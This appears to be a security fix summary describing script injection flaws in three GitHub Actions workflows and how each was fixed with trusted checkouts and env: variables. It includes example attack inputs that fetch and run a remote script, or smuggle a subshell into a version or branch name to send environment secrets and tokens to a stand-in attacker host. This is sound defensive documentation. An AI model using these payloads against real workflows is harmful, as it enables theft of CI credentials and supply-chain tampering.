# GitHub Actions Security Fixes

## Overview

Three workflow files contained script injection vulnerabilities allowing arbitrary command execution on the GitHub Actions runner with access to repository secrets.

---

## 1. `prepend-license.yml` — Pwned by PR

### Problem

The workflow triggered on `pull_request` (including from forks) and checked out the PR contributor's code using a privileged token:

```yaml
on:
  pull_request:
    types: [opened, synchronize]

- uses: actions/checkout@...
  with:
    ref: ${{ github.event.pull_request.head.ref }}
    token: ${{ secrets.GH_PR_TOKEN }}          # write-access token

- run: ci-scripts/prepend-license.sh           # attacker's version of this script
```

Any external contributor could put `curl evil.com/pwn | bash` inside their fork's `ci-scripts/prepend-license.sh`. When they opened a PR, the workflow would execute their script with `GH_PR_TOKEN` (which has `contents: write` and `pull-requests: write` on the main repo).

A previous fix moved `${{ github.event.pull_request.head.ref }}` into an `env:` variable on the `git pull` step. That stopped branch-name shell injection on that one line, but the bigger problem — running attacker-controlled scripts — was untouched.

### Fix

Switch to `pull_request_target` with a two-step checkout:

1. **Check out the base branch first** (with the privileged token). This means `ci-scripts/prepend-license.sh` always comes from trusted, reviewed code.
2. **Overlay only the PR's source files** (by immutable `head.sha`, no token) into a temp directory, then `rsync` them over while explicitly excluding `ci-scripts/` and `.github/`.

```yaml
on:
  pull_request_target:          # workflow definition runs from base branch

- uses: actions/checkout@...
  with:
    ref: ${{ github.event.pull_request.base.ref }}   # trusted base
    token: ${{ secrets.GH_PR_TOKEN }}

- uses: actions/checkout@...
  with:
    ref: ${{ github.event.pull_request.head.sha }}   # immutable SHA, no token
    path: pr-head

- run: rsync -a --exclude='ci-scripts/' --exclude='.github/' pr-head/ . && rm -rf pr-head

- run: ci-scripts/prepend-license.sh                # always the base branch's script
```

`pull_request_target` runs the workflow definition from the base branch (not the PR), so even the workflow file itself cannot be tampered with. Using `head.sha` instead of `head.ref` prevents a TOCTOU attack where a new commit is pushed between trigger and checkout.

---

## 2. `update-cloud-repo.yml` — Input Injection into Shell Script Source

### Problem

GitHub Actions substitutes `${{ expression }}` **before** the shell runs. This means user inputs interpolated directly into a `run:` block become part of the script's source code, not just a value passed to it.

```yaml
- run: |
    local version=${{ github.event.inputs.version }}   # substituted into script source
    local npm_token=${{ github.event.inputs.npm_token }}
```

With `version = 1.0$(curl attacker.com?t=$(env|base64))`, the runner executes:

```bash
local version=1.0$(curl attacker.com?t=$(env|base64))
```

The subshell runs, exfiltrating all environment variables including `GH_TEMPORARY_TOKEN`, which has push access to `SAP-samples/cloud-commerce-sample-setup` — a customer-facing sample repository. An attacker with a compromised collaborator account (or in some GitHub configurations, direct API access) could use this to inject a backdoor into the samples repo, creating a supply chain attack against SAP Commerce Cloud customers.

The same pattern appeared on `repo_url` (injected into `git clone` and `git push` unquoted) and `version` (used in path construction for `cp`).

### Fix

Assign all user inputs to `env:` variables at the step level. GitHub Actions passes these as actual environment variables to the shell process — they are never part of the script source, so no amount of shell metacharacters in the value can break out.

```yaml
- name: Create storefronts
  env:
    INPUT_VERSION: ${{ github.event.inputs.version }}     # safe: passed as env var
    INPUT_NPM_TOKEN: ${{ github.event.inputs.npm_token }}
  run: |
    local version="$INPUT_VERSION"     # shell variable, not script source injection
    local npm_token="$INPUT_NPM_TOKEN"
```

---

## 3. `repo-sync.yml` — Branch Name Injection into Git and Sed Commands

### Problem

Same class of vulnerability as `update-cloud-repo.yml`. The `branch_to_sync` input was interpolated directly into the script source in multiple places:

```yaml
- run: |
    git push -u https://...@github.tools.sap/.../${{ secrets.GHT_SPARTACUS_REPO }}.git \
      ${{ github.event.inputs.branch_to_sync || env.DEFAULT_BRANCH_TO_SYNC }} -f

    git clone -b ${{ github.event.inputs.branch_to_sync || env.DEFAULT_BRANCH_TO_SYNC }} https://...

    sed -i "s%productiveBranch:%productiveBranch: '${{ github.event.inputs.branch_to_sync || env.DEFAULT_BRANCH_TO_SYNC }}'%gi" ...
```

With `branch_to_sync = develop$(curl${IFS}attacker.com?token=$GHT_PRIVATE_REPO_TOKEN)`, the injected subshell exfiltrates `GHT_PRIVATE_REPO_TOKEN` — a credential for `github.tools.sap`, SAP's internal GitHub Enterprise instance. This would give an attacker access to SAP's private internal repositories.

This workflow also runs on a `schedule`, meaning the default branch is synced automatically every day — the vulnerability only requires `workflow_dispatch` with a crafted input to exploit.

### Fix

Same pattern: move all inputs and secrets into `env:` blocks and reference them as shell variables.

```yaml
- name: Push a branch to the private repository
  env:
    BRANCH_TO_SYNC: ${{ github.event.inputs.branch_to_sync || env.DEFAULT_BRANCH_TO_SYNC }}
    GHT_USER: ${{ secrets.GHT_USER }}
    GHT_PRIVATE_REPO_TOKEN: ${{ secrets.GHT_PRIVATE_REPO_TOKEN }}
    GHT_SPARTACUS_REPO: ${{ secrets.GHT_SPARTACUS_REPO }}
  run: |
    git push -u "https://${GHT_USER}:${GHT_PRIVATE_REPO_TOKEN}@github.tools.sap/.../${GHT_SPARTACUS_REPO}.git" "$BRANCH_TO_SYNC" -f
```

---

## General Rule

Never write `${{ inputs.* }}`, `${{ github.event.inputs.* }}`, or `${{ secrets.* }}` directly inside a `run:` block. Always use an `env:` mapping on the step and reference `$VAR_NAME` in the shell instead.
